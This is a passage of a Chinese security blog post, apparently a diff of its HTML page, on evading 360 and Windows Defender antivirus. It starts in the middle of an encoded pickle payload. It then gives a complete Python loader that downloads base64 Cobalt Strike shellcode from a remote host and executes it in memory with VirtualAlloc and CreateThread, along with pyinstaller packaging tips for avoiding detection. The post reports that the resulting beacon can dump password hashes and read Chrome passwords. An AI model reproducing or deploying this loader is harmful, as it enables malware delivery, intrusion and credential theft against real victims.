y5jX2ludCgwKSwgCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKIyDnrYnlvoXkuIrpnaLliJvlu7rnmoTnur/nqIvov5DooYzlrowKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkplIWUUpQu&#x27;</span></span><br><span class="line"><span class="comment"># pickle.loads(base64.b64decode(payload))</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第四种-bypass360全家桶-DEF"><a href="#第四种-bypass360全家桶-DEF" class="headerlink" title="第四种(bypass360全家桶+DEF)"></a>第四种(bypass360全家桶+DEF)</h2><p>PY打包pyinstaller被列入黑名单了，建议用其他打包py2exe,但是我本地py2exe打不成一个单独的文件，所以放弃了</p>
+<p>pyinstall  -F x.py（不报毒）</p>
+<p>注意：加上<code>--noconsole</code>立马报毒，但是不加会有黑窗口弹出。</p>
+<p>pyinstall –noconsole -F x.py（报毒）</p>
+<p>直接用类加载shellcode，省去了序列化和反序列化的过程。。。。。。</p>
+<p>注意⚠️：远程shellcode(CS生成C语言的payload之后，对其base64编码，然后去掉b’’,只保留内容类似<code>/EiD5PDoy==</code>)</p>
+<p>访问远程的shellcode,然后申请内存，直接执行。。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.set_payload()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        shellcode = urllib.request.urlopen(<span class="string">&#x27;http://10.10.12.189:8000/payload.c&#x27;</span>).read()</span><br><span class="line">        shellcode = base64.b64decode(shellcode)</span><br><span class="line">        shellcode =codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">        shellcode = bytearray(shellcode)</span><br><span class="line">        <span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">        <span class="comment"># 申请内存</span></span><br><span class="line">        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 放入shellcode</span></span><br><span class="line">        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            buf, </span><br><span class="line">            ctypes.c_int(len(shellcode))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">        handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="第四种方法的测试截图："><a href="#第四种方法的测试截图：" class="headerlink" title="第四种方法的测试截图："></a>第四种方法的测试截图：</h3><p>CS正常上线，读取hash正常。</p>
+<p><img src="/posts/ccfc56a5/image-20210122112552869.png" alt="image-20210122112552869"></p>
+<p><strong>上传下载正常</strong></p>
+<p><img src="/posts/ccfc56a5/image-20210122112923431.png" alt="image-20210122112923431"></p>
+<p><strong>读取chrome密码正常：</strong></p>
+<p><img src="/posts/ccfc56a5/image-20210122113847166.png" alt="image-20210122113847166"></p>
+<p>该方法在360杀毒的7版本没事，但是在5版本给干掉了。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/ccfc56a5/" title="bypass杀软">https://butnomingzi.github.io/posts/ccfc56a5/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="fa fa-tag"></i> 免杀</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/e603ef6a/" rel="prev" title="Lanproxy任意文件读取(CVE-2021-3019)">
+      <i class="fa fa-chevron-left"></i> Lanproxy任意文件读取(CVE-2021-3019)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/32c3cb6e/" rel="next" title="FastJson 1.2.47 反序列化复现">
+      FastJson 1.2.47 反序列化复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">第一种方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D-%E5%8F%98%E7%A7%8D"><span class="nav-number">2.</span> <span class="nav-text">第二种(变种)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D"><span class="nav-number">3.</span> <span class="nav-text">第三种</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%A7%8D-bypass360%E5%85%A8%E5%AE%B6%E6%A1%B6-DEF"><span class="nav-number">4.</span> <span class="nav-text">第四种(bypass360全家桶+DEF)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95%E7%9A%84%E6%B5%8B%E8%AF%95%E6%88%AA%E5%9B%BE%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">第四种方法的测试截图：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">oudeniu</p>
+  <div class="site-description" itemprop="description">一点都对，半点都没错。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy8=" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;">宽字节安全</span>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=420 src="//music.163.com/outchain/player?type=0&id=5008808022&auto=1&height=430"></iframe>
+      </div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oudeniu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">239k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:37</span>
+</div>
+    <!-- 网站运行时间的设置 -->
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>  
+    <script>
+        var now = new Date();
+        function createtime() {
+            var grt= new Date("03/03/2020 13:14:21");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+            document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+    setInterval("createtime()",250);
+    </script>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-firestore.js"></script>
+  <script>
+    firebase.initializeApp({
+      apiKey   : '',
+      projectId: ''
+    });
+
+    function getCount(doc, increaseCount) {
+      // IncreaseCount will be false when not in article page
+      return doc.get().then(d => {
+        var count = 0;
+        if (!d.exists) { // Has no data, initialize count
+          if (increaseCount) {
+            doc.set({
+              count: 1
+            });
+            count = 1;
+          }
+        } else { // Has data
+          count = d.data().count;
+          if (increaseCount) {
+            // If first view this article
+            doc.set({ // Increase count
+              count: count + 1
+            });
+            count++;
+          }
+        }
+
+        return count;
+      });
+    }
+
+    function appendCountTo(el) {
+      return count => {
+        el.innerText = count;
+      }
+    }
+  </script>
+  <script data-pjax>
+    (function() {
+      var db = firebase.firestore();
+      var articles = db.collection('articles');
+
+      if (CONFIG.page.isPost) { // Is article page
+        var title = document.querySelector('.post-title').innerText.trim();
+        var doc = articles.doc(title);
+        var increaseCount = CONFIG.hostname === location.hostname;
+        if (localStorage.getItem(title)) {
+          increaseCount = false;
+        } else {
+          // Mark as visited
+          localStorage.setItem(title, true);
+        }
+        getCount(doc, increaseCount).then(appendCountTo(document.querySelector('.firestore-visitors-count')));
+      } else if (CONFIG.page.isHome) { // Is index page
+        var promises = [...document.querySelectorAll('.post-title')].map(element => {
+          var title = element.innerText.trim();
+          var doc = articles.doc(title);
+          return getCount(doc);
+        });
+        Promise.all(promises).then(counts => {
+          var metas = document.querySelectorAll('.firestore-visitors-count');
+          counts.forEach((val, idx) => {
+            appendCountTo(metas[idx])(val);
+          });
+        });
+      }
+    })();
+  </script>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"}});</script></body>
+</html>
